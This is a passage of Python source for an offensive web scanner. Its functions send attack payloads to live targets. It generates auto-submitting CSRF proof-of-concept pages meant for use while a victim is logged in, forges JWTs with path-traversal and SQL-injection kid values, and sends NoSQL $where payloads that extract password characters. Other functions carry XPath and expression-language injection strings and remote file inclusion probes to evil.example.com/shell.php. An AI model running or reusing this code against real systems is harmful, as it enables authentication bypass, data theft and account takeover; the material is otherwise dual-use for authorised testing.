                fields[name] = val or "CSRF_PAYLOAD"
        if has_csrf_token or not fields:
            continue
        inputs_html = "\n    ".join(
            '<input type="hidden" name="{}" value="{}">'.format(k, v)
            for k, v in fields.items()
        )
        poc_html = (
            '<!DOCTYPE html><html><body>\n'
            '<h1>CSRF PoC -- ' + action + '</h1>\n'
            '<form action="' + action + '" method="POST">\n'
            '    ' + inputs_html + '\n'
            '    <input type="submit" value="Submit">\n'
            '</form>\n'
            '<script>document.forms[0].submit();</script>\n'
            '</body></html>'
        )
        poc_count += 1
        fname = _resolve_output_path("csrf_poc_" + str(poc_count) + ".html", "pocs") or ("csrf_poc_" + str(poc_count) + ".html")
        try:
            with open(fname, "w", encoding="utf-8") as f:
                f.write(poc_html)
            out.append(("CSRF PoC written: " + fname + "  (POST " + action + "  fields: " + ",".join(fields) + ")",
                        "open " + fname + " in a browser while victim is logged in"))
        except Exception as e:
            out.append(("CSRF unprotected form at " + action + " (could not write PoC: " + str(e) + ")",
                        "fields: " + ",".join(fields)))
    return out

def scan_jwt_kid_injection(base: str) -> ScanFindings:
    out: ScanFindings = []
    c, h, b, _ = _req(base)
    if c == 0:
        return out
    text = b.decode("utf-8", "ignore") + " " + h.get("set-cookie", "") + " " + h.get("authorization", "")
    jwt_re = re.compile(r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+')
    tokens = list(set(jwt_re.findall(text)))
    if not tokens:
        return out

    def _forge_kid(original: str, kid_val: str, secret: str = "") -> str:
        try:
            parts = original.split(".")
            header_b = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
            payload_b = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
            header_b["kid"] = kid_val
            header_b["alg"] = "HS256"
            new_head = base64.urlsafe_b64encode(
                json.dumps(header_b, separators=(",", ":")).encode()).decode().rstrip("=")
            new_pay  = base64.urlsafe_b64encode(
                json.dumps(payload_b, separators=(",", ":")).encode()).decode().rstrip("=")
            signing_input = (new_head + "." + new_pay).encode()
            sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
            new_sig = base64.urlsafe_b64encode(sig).decode().rstrip("=")
            return new_head + "." + new_pay + "." + new_sig
        except Exception:
            return ""

    kid_payloads = [
        ("../../dev/null",          "",          "path traversal -> sign with empty secret"),
        ("/dev/null",               "",          "absolute path -> empty secret"),
        ("' UNION SELECT 'secret'-- -", "secret","SQL injection -> control signing secret"),
        ("\" UNION SELECT 'x'-- -", "x",         "SQL injection double-quote variant"),
        ("../../../../../../../dev/null", "",     "deep path traversal"),
        ("nonexistent",             "",          "nonexistent key -> fallback empty"),
    ]

    for token in tokens[:2]:
        original_auth = h.get("authorization", "Bearer " + token)
        for kid_val, signing_secret, label in kid_payloads:
            forged = _forge_kid(token, kid_val, signing_secret)
            if not forged:
                continue
            probe_headers = {"Authorization": "Bearer " + forged}
            if "cookie" in h.get("set-cookie", "").lower():
                cookie_name = re.search(r'([A-Za-z_][\w]*)=' + re.escape(token[:10]), h.get("set-cookie", ""))
                if cookie_name:
                    probe_headers["Cookie"] = cookie_name.group(1) + "=" + forged
            c2, h2, b2, _ = _req(base, headers=probe_headers)
            body2 = b2.decode("utf-8", "ignore").lower()
            c_base, _, b_base, _ = _req(base)
            body_base = b_base.decode("utf-8", "ignore").lower()
            auth_words = ["dashboard", "welcome", "logout", "account", "profile", "admin", "authenticated"]
            if c2 == 200 and any(w in body2 for w in auth_words) and not any(w in body_base for w in auth_words):
                out.append(("JWT kid injection auth bypass: " + label, "kid=" + kid_val[:60]))
                break
            if c2 != c_base and c2 not in (401, 403, 400):
                out.append(("JWT kid injection behavior change (" + str(c_base) + "?>" + str(c2) + "): " + label,
                            "kid=" + kid_val[:60]))
    return out

def scan_unicode_bypass(url: str) -> ScanFindings:
    out: ScanFindings = []
    parsed = urllib.parse.urlparse(url)
    origin = parsed.scheme + "://" + parsed.netloc
    sensitive_paths = ["/admin", "/dashboard", "/config", "/manage", "/api/admin",
                       "/internal", "/private", "/secret", "/debug", "/console"]
    transforms = [
        (lambda p: p.upper(),                            "uppercase"),
        (lambda p: p.replace("/", "\\/"),                "backslash"),
        (lambda p: p.replace("/a", "/\uff41").replace("/d","/\uff44").replace("/c","/\uff43").replace("/m","/\uff4d").replace("/i","/\uff49").replace("/n","/\uff4e").replace("/s","/\uff53").replace("/e","/\uff45").replace("/g","/\uff47").replace("/r","/\uff52").replace("/b","/\uff42").replace("/p","/\uff50").replace("/o","/\uff4f").replace("/u","/\uff55").replace("/t","/\uff54"),  "fullwidth"),
        (lambda p: urllib.parse.quote(p, safe=""),       "percent-encode"),
        (lambda p: p.replace("/", "/%2f"),               "double-encode slash"),
        (lambda p: p.replace("/", "/./"),                "dot-segment"),
        (lambda p: p + "/",                              "trailing slash"),
        (lambda p: p.replace("/admin", "/ADMIN"),        "uppercase segment"),
        (lambda p: p.replace("a", "\u0430").replace("e","\u0435").replace("o","\u043e"), "cyrillic homoglyph"),
    ]
    c_base, _, b_base, _ = _req(url)
    for path in sensitive_paths:
        normal_url = origin + path
        c_normal, _, _, _ = _req(normal_url)
        if c_normal == 200:
            continue
        for fn, label in transforms:
            try:
                transformed = fn(path)
            except Exception:
                continue
            test_url = origin + transformed
            c, _, b, _ = _req(test_url)
            if c == 200 and c_normal != 200:
                body = b.decode("utf-8", "ignore").lower()
                if any(k in body for k in ["admin", "dashboard", "config", "manage", "debug", "console", "panel"]):
                    out.append(("unicode/encoding bypass to restricted path " + path + " via " + label, test_url))
                    break
    params = _extract_params(url) or []
    bypass_chars = ["\u0000", "\u200b", "\ufeff", "%00", "%0d%0a", "\\u0000"]
    for param in params[:3]:
        baseline_val = "test"
        c0, _, b0, _ = _req(_inject_param(url, param, baseline_val))
        for ch in bypass_chars:
            test = _inject_param(url, param, "admin" + ch)
            c, _, b, _ = _req(test)
            if c != c0 or len(b) - len(b0) > 100:
                out.append(("null/zero-width byte changes behavior on param '" + param + "'", repr(ch)))
                break
    return out

def scan_server_timing_leak(base: str) -> ScanFindings:
    out: ScanFindings = []
    c, h, b, _ = _req(base)
    if c == 0:
        return out
    st = h.get("server-timing", "")
    if st:
        components = [s.strip() for s in st.split(",")]
        internal = [s for s in components if any(k in s.lower() for k in
                    ["db", "sql", "query", "cache", "redis", "mongo", "postgres",
                     "mysql", "elastic", "dynamo", "fetch", "http", "rpc", "grpc",
                     "auth", "render", "template", "compile", "total"])]
        if internal:
            out.append(("Server-Timing header leaks internal component names: " + ", ".join(internal[:6]),
                        "header: " + st[:200]))
    timing_paths = ["/api/", "/graphql", "/login", "/search", "/user"]
    for path in timing_paths:
        tc, th, _, _ = _req(base.rstrip("/") + path)
        ts = th.get("server-timing", "")
        if ts and ts != st:
            comps = [s.strip() for s in ts.split(",")]
            for comp in comps:
                dur_m = re.search(r'dur=([0-9.]+)', comp)
                if dur_m:
                    dur = float(dur_m.group(1))
                    name_m = re.search(r'^([A-Za-z0-9_\-]+)', comp)
                    name = name_m.group(1) if name_m else comp
                    if dur > 0:
                        out.append(("Server-Timing exposes '" + name + "' timing on " + path
                                    + " (" + str(round(dur, 1)) + "ms) -- oracle for blind enumeration",
                                    "Use timing delta to distinguish valid vs invalid " + name))
                        break
    xst_headers = ["X-Runtime", "X-Response-Time", "X-Request-Duration",
                   "X-Served-In", "X-Processing-Time", "X-Backend-Time"]
    for xh in xst_headers:
        val = h.get(xh.lower(), "")
        if val:
            try:
                ms = float(re.sub(r"[^0-9.]", "", val))
                if ms > 0:
                    out.append(("Timing header " + xh + "=" + val + " leaks backend processing time",
                                "Precision timing oracle for user/account enumeration"))
            except Exception:
                pass
    return out

def scan_nosql_blind(url: str) -> ScanFindings:
    out: ScanFindings = []
    params = _extract_params(url) or ["username", "email", "user", "q", "id", "search", "filter"]
    true_payloads = [
        ("' || '1'=='1",           "js-injection"),
        ("'; return true; var x='", "js-return-true"),
        ('{"$gt": ""}',            "gt-operator"),
        ('{"$ne": null}',          "ne-operator"),
        ('{"$regex": ".*"}',       "regex-wildcard"),
        ('{"$where": "1==1"}',     "where-true"),
    ]
    false_payloads = [
        ("' || '1'=='2",            "js-false"),
        ('{"$gt": "zzzzzzzzzz"}',   "gt-impossible"),
        ('{"$ne": "x"}',            "ne-impossible"),
        ('{"$regex": "^ZZZZZZ"}',   "regex-impossible"),
        ('{"$where": "1==2"}',      "where-false"),
    ]
    for param in params[:4]:
        c_base, _, b_base, _ = _req(url)
        results_true  = []
        results_false = []
        for pay, _ in true_payloads[:3]:
            c, _, b, _ = _req(_inject_param(url, param, pay))
            results_true.append((c, len(b)))
        for pay, _ in false_payloads[:3]:
            c, _, b, _ = _req(_inject_param(url, param, pay))
            results_false.append((c, len(b)))
        true_avg  = sum(n for _, n in results_true)  / max(len(results_true),  1)
        false_avg = sum(n for _, n in results_false) / max(len(results_false), 1)
        base_len  = len(b_base)
        true_codes  = set(c for c, _ in results_true)
        false_codes = set(c for c, _ in results_false)
        if true_codes != false_codes and not (true_codes <= {0} or false_codes <= {0}):
            out.append(("NoSQL blind boolean oracle on param '" + param + "': true=" + str(true_codes)
                        + " false=" + str(false_codes), url))
            break
        if abs(true_avg - false_avg) > 64 and abs(true_avg - base_len) > 32:
            out.append(("NoSQL blind length oracle on param '" + param + "': "
                        + "true_avg=" + str(int(true_avg)) + " false_avg=" + str(int(false_avg)),
                        "boolean-based extraction possible"))
            break
    where_payloads = [
        ('{"$where": "this.password.match(/^a/)"}', "regex char extraction on password field"),
        ('{"$where": "Object.keys(this).length > 5"}', "field count oracle"),
        ('{"$where": "this.role==\'admin\'"}', "admin role boolean"),
    ]
    for param in params[:2]:
        c_base, _, b_base, _ = _req(url)
        for pay, label in where_payloads:
            c, _, b, _ = _req(_inject_param(url, param, pay))
            if c == 200 and len(b) != len(b_base) and c != 0:
                out.append(("NoSQL $where JS injection on param '" + param + "': " + label, pay))
                break
    return out

def scan_param_miner(url: str) -> ScanFindings:
    out: ScanFindings = []
    baseline: Set[Tuple[int, int, int]] = set()

    def _baseline_probe(_: int) -> Optional[Tuple[int, int, int]]:
        jitter = hashlib.md5(os.urandom(4)).hexdigest()[:6]
        qsep = "&" if "?" in url else "?"
        c, h, b, _ = _req(url + qsep + "nocache_" + jitter + "=1")
        if c == 0:
            return None
        return _param_sim_key(c, b, h)

    with ThreadPoolExecutor(max_workers=4) as ex:
        futs = [ex.submit(_baseline_probe, i) for i in range(4)]
        for fut in as_completed(futs):
            try:
                key = fut.result()
            except Exception:
                key = None
            if key is not None:
                baseline.add(key)
    if not baseline:
        return out

    canary = "mn" + hashlib.md5(os.urandom(6)).hexdigest()[:8]
    existing = set(_extract_params(url))
    candidates = [p for p in _PARAM_WORDLIST if p not in existing]

    batch_size = 40
    hits: List[Tuple[str, str]] = []
    for i in range(0, len(candidates), batch_size):
        batch = candidates[i:i + batch_size]
        qsep = "&" if "?" in url else "?"
        query = "&".join(p + "=" + canary + "_" + p[:8] for p in batch)
        c, h, b, _ = _req(url + qsep + query, timeout=10.0)
        if c == 0:
            continue
        key = _param_sim_key(c, b, h)
        body = b.decode("utf-8", "ignore")
        batch_reflected = [(p, "reflected in body") for p in batch
                           if canary + "_" + p[:8] in body]
        if batch_reflected:
            hits.extend(batch_reflected)
            continue
        if key not in baseline:
            isolated = _param_bisect(url, batch, canary, baseline)
            hits.extend(isolated)

    header_candidates = [
        "X-Forwarded-For", "X-Original-URL", "X-Rewrite-URL", "X-Override-URL",
        "X-Forwarded-Host", "X-Forwarded-Proto", "X-Forwarded-Scheme",
        "X-Remote-IP", "X-Real-IP", "X-Client-IP", "X-Host", "X-HTTP-Host-Override",
        "X-Debug", "X-Debug-Mode", "X-Debug-Token", "X-Internal", "X-Admin",
        "X-User-ID", "X-Tenant", "X-Account-ID", "X-Impersonate", "X-On-Behalf-Of",
        "X-Original-Method", "X-HTTP-Method-Override", "X-Method-Override",
        "X-Api-Version", "X-Trace", "X-Request-ID",
    ]
    c0, h0, b0, _ = _req(url)
    base_key = _param_sim_key(c0, b0, h0)

    def _probe_header(hdr: str) -> Optional[Tuple[str, str]]:
        hval = canary + "?val"
        c, h, b, _ = _req(url, headers={hdr: hval})
        body = b.decode("utf-8", "ignore")
        if hval in body:
            return (hdr + " [header]", "header value reflected")
        key = _param_sim_key(c, b, h)
        if key != base_key and key not in baseline:
            if abs(len(b) - len(b0)) > 32 or c != c0:
                return (hdr + " [header]",
                        "server behavior changed (code=%d len=%d vs base code=%d len=%d)"
                        % (c, len(b), c0, len(b0)))
        return None

    with ThreadPoolExecutor(max_workers=min(12, len(header_candidates))) as ex:
        futs = [ex.submit(_probe_header, hdr) for hdr in header_candidates]
        for fut in as_completed(futs):
            try:
                hit = fut.result()
            except Exception:
                hit = None
            if hit:
                hits.append(hit)

    seen: Set[str] = set()
    for name, evidence in hits:
        if name in seen:
            continue
        seen.add(name)
        out.append(("hidden parameter discovered: " + name, evidence))
    return out



def scan_postmessage_dom_audit(base: str) -> ScanFindings:
    out: ScanFindings = []
    c, h, b, _ = _req(base)
    if c == 0:
        return out
    body = b.decode("utf-8", "ignore")

    csp = h.get("content-security-policy", "")
    xfo = h.get("x-frame-options", "")
    if "frame-ancestors" not in csp.lower() and not xfo:
        out.append(("no frame-ancestors CSP + no X-Frame-Options: embeddable for postMessage/clickjack hijack", base))

    script_srcs = re.findall(r'<script[^>]+src=["\']([^"\']+)["\']', body, re.IGNORECASE)
    inline_js = "\n".join(re.findall(r'<script[^>]*>(.*?)</script>', body, re.IGNORECASE | re.DOTALL))
    js_sources: List[Tuple[str, str]] = [(base + " [inline]", inline_js)]
    base_host = urllib.parse.urlparse(base).hostname or ""

    def _fetch_js_source(src: str) -> Optional[Tuple[str, str]]:
        if src.startswith("//"):
            full = "https:" + src
        else:
            full = urllib.parse.urljoin(base, src)
        parsed = urllib.parse.urlparse(full)
        if parsed.hostname and base_host and parsed.hostname != base_host:
            if not parsed.hostname.endswith(base_host) and not base_host.endswith(parsed.hostname or ""):
                return None
        jc, _, jb, _ = _req(full)
        if jc == 200 and len(jb) < 2 * 1024 * 1024:
            return (src, jb.decode("utf-8", "ignore"))
        return None

    with ThreadPoolExecutor(max_workers=min(8, len(script_srcs[:8]) or 1)) as ex:
        futs = [ex.submit(_fetch_js_source, src) for src in script_srcs[:8]]
        for fut in as_completed(futs):
            try:
                source = fut.result()
            except Exception:
                source = None
            if source:
                js_sources.append(source)

    findings_dedup: Set[str] = set()

    def _record(tag: str, evidence: str) -> None:
        key = tag + "|" + evidence[:80]
        if key in findings_dedup:
            return
        findings_dedup.add(key)
        out.append((tag, evidence))

    post_star_pat      = re.compile(r'\.postMessage\s*\(\s*([^,]+),\s*[\'"]\*[\'"]\s*\)')
    listener_pat       = re.compile(r'addEventListener\s*\(\s*[\'"]message[\'"]\s*,\s*(?:function\s*\([^)]*\)\s*\{|\([^)]*\)\s*=>\s*\{|[A-Za-z_$][\w$]*)', re.DOTALL)
    handler_body_pat   = re.compile(r'addEventListener\s*\(\s*[\'"]message[\'"]\s*,\s*(?:function\s*\([^)]*\)\s*|(\([^)]*\))\s*=>\s*)(\{(?:[^{}]|\{[^{}]*\})*\})', re.DOTALL)
    origin_check_pat   = re.compile(r'\.origin\s*(?:===|==|!==|!=|\.(?:indexOf|includes|startsWith|endsWith|match))', re.DOTALL)
    eval_from_event_pat= re.compile(r'(?:eval|Function|setTimeout|setInterval)\s*\(\s*(?:event|msg|e|evt)\.data', re.DOTALL)
    innerHTML_from_evt = re.compile(r'\.innerHTML\s*=\s*(?:event|msg|e|evt)\.data', re.DOTALL)
    clobber_getel_pat  = re.compile(r'document\.(?:getElementById|forms|images|anchors|embeds)\s*\(\s*(?:[A-Za-z_$][\w$]*|window\.|location\.)')
    clobber_windowidx  = re.compile(r'window\s*\[\s*[A-Za-z_$][\w$]*\s*\]')
    loc_hash_sink      = re.compile(r'(?:eval|Function|innerHTML|outerHTML|document\.write|setTimeout|setInterval|location\s*=)\s*[\(=]\s*[^)]*(?:location\.hash|location\.search|location\.href|decodeURIComponent\(location)', re.DOTALL)
    jsonp_callback_pat = re.compile(r'[-&](?:callback|cb|jsonp|_callback)=\s*[A-Za-z_$]')

    for src_name, code in js_sources:
        for m in post_star_pat.finditer(code):
            ln = code[:m.start()].count("\n") + 1
            snippet = m.group(0).strip()
            _record("postMessage wildcard '*' target origin in " + src_name + ":" + str(ln),
                    "leaks data to any embedding origin - " + snippet[:140])

        for m in handler_body_pat.finditer(code):
            handler_body = m.group(2) or ""
            if origin_check_pat.search(handler_body):
                continue
            ln = code[:m.start()].count("\n") + 1
            if eval_from_event_pat.search(handler_body):
                _record("postMessage handler with eval/Function from event.data (RCE) in " + src_name + ":" + str(ln),
                        handler_body[:180].replace("\n", " "))
            elif innerHTML_from_evt.search(handler_body):
                _record("postMessage handler writes event.data to innerHTML (XSS) in " + src_name + ":" + str(ln),
                        handler_body[:180].replace("\n", " "))
            else:
                _record("postMessage listener without origin check in " + src_name + ":" + str(ln),
                        handler_body[:180].replace("\n", " "))

        for m in clobber_getel_pat.finditer(code):
            ln = code[:m.start()].count("\n") + 1
            _record("DOM clobbering sink (getElementById with non-literal) in " + src_name + ":" + str(ln),
                    m.group(0))

        for m in clobber_windowidx.finditer(code[:200000]):
            snippet = m.group(0)
            if any(k in snippet for k in ["console", "Math", "Object", "Array"]):
                continue
            ln = code[:m.start()].count("\n") + 1
            _record("DOM clobbering risk: window[variable] read in " + src_name + ":" + str(ln), snippet)

        for m in loc_hash_sink.finditer(code):
            ln = code[:m.start()].count("\n") + 1
            _record("DOM-based XSS sink: location.hash/search/href flows to dangerous sink in " + src_name + ":" + str(ln),
                    m.group(0)[:180])

        if jsonp_callback_pat.search(code):
            _record("JSONP callback pattern present (reflected-script risk) in " + src_name,
                    "callback=<attacker-controlled>")

    if re.search(r'document\.domain\s*=', body + inline_js):
        _record("document.domain assignment found (relaxes same-origin, enables subdomain XSS pivot)",
                "static review of main HTML")

    return out

def scan_xpath_injection(url: str) -> ScanFindings:
    out: ScanFindings = []
    params = _extract_params(url) or ["user", "username", "name", "search", "id", "query", "login"]
    payloads = [
        "' or '1'='1",
        "x' or '1'='1",
        "' or 1=1 or ''='",
        "'] | //user/*[1='1",
        "' or count(/)>0 or ''='",
        "admin'] | //user[username/text()='admin",
    ]
    xpath_err = re.compile(
        r"xpath|xmlpathexception|xpathexception|invalid expression|xpath error|"
        r"unterminated string literal|xpathnavigator|msxml|libxml2|saxon",
        re.I,
    )
    for param in params[:6]:
        _, _, base_body, _ = _req(_inject_param(url, param, "test"))
        base_text = base_body.decode("utf-8", "ignore")
        for pay in payloads:
            c, _, body, _ = _req(_inject_param(url, param, pay))
            text = body.decode("utf-8", "ignore")
            if xpath_err.search(text) and not xpath_err.search(base_text):
                out.append(("[CONFIRMED] XPath injection (error-based) on param " + param, pay))
                break
            if c == 200 and abs(len(body) - len(base_body)) > 300 and "' or " in pay:
                out.append(("XPath injection: boolean response differential on param " + param, pay))
                break
    return out

def scan_rfi(url: str) -> ScanFindings:
    out: ScanFindings = []
    params = _extract_params(url) or ["file", "page", "include", "path", "template", "view", "doc", "load"]
    rfi_probes = [
        "http://evil.example.com/shell.php",
        "https://evil.example.com/test.txt",
    ]
    for param in params[:6]:
        _, _, base_body, _ = _req(_inject_param(url, param, "test"))
        for pay in rfi_probes:
            c, _, body, _ = _req(_inject_param(url, param, pay))
            text = body.decode("utf-8", "ignore")
            if "evil.example.com" in text and "evil.example.com" not in base_body.decode("utf-8", "ignore"):
                out.append(("[CONFIRMED] remote file inclusion: injected URL fetched/echoed on param " + param, pay))
                break
            if c == 200 and abs(len(body) - len(base_body)) > 500:
                out.append(("RFI possible: large body differential on remote URL injection for param " + param, pay))
                break
    return out

def scan_account_enumeration(base: str) -> ScanFindings:
    out: ScanFindings = []
    parsed = urllib.parse.urlparse(base)
    login_paths = ["/login", "/signin", "/auth", "/user/login", "/api/login",
                   "/forgot-password", "/password-reset", "/api/v1/login", "/api/auth"]
    endpoints: List[str] = []
    for path in login_paths:
        u = parsed.scheme + "://" + parsed.netloc + path
        c, _, _, _ = _req(u, timeout=5.0)
        if c not in (0, 404):
            endpoints.append(u)
    if not endpoints:
        return out
    known = ["admin", "administrator", "root", "test"]
    noise = "xnobody" + hashlib.md5(os.urandom(4)).hexdigest()[:8]
    for ep in endpoints[:2]:
        def _post(uname: str) -> Tuple[int, int]:
            d = urllib.parse.urlencode({"username": uname, "password": "Wr0ngPwd!9x",
                                        "email": uname + "@x.com"}).encode()
            c2, _, b2, _ = _req(ep, method="POST", data=d,
                                 content_type="application/x-www-form-urlencoded")
            return c2, len(b2)
        c_noise, l_noise = _post(noise)
        for uname in known:
            c_k, l_k = _post(uname)
            if c_k != c_noise or abs(l_k - l_noise) > 60:
                out.append(("account enumeration: different response for '" + uname
                            + "' vs random username on " + ep,
                            "known=%d/%d noise=%d/%d" % (c_k, l_k, c_noise, l_noise)))
                break
    return out

def scan_expression_language(url: str) -> ScanFindings:
    out: ScanFindings = []
    params = _extract_params(url) or ["name", "input", "msg", "query", "value", "data", "expr"]
    payloads: List[Tuple[str, str]] = [
        ("${7777*7777}",               "60481729"),
        ("#{7777*7777}",               "60481729"),
        ("%24%7B7777*7777%7D",         "60481729"),
        ("*{7777*7777}",               "60481729"),
        ("[[7777*7777]]",              "60481729"),
        ("${T(java.lang.Math).PI}",    "3.14159"),
    ]
    for param in params[:6]:
        baseline = _req(_inject_param(url, param, "hello"))[2].decode("utf-8", "ignore")
        for pay, expected in payloads:
            text = _req(_inject_param(url, param, pay))[2].decode("utf-8", "ignore")
            if expected in text and expected not in baseline:
                out.append(("[CONFIRMED] expression language injection on param " + param
                            + " (expression evaluated: " + expected + ")", pay))
                break
            if "java.lang." in text and "java.lang." not in baseline:
                out.append(("expression language injection: Java class leaked via param " + param, pay))
                break
    return out

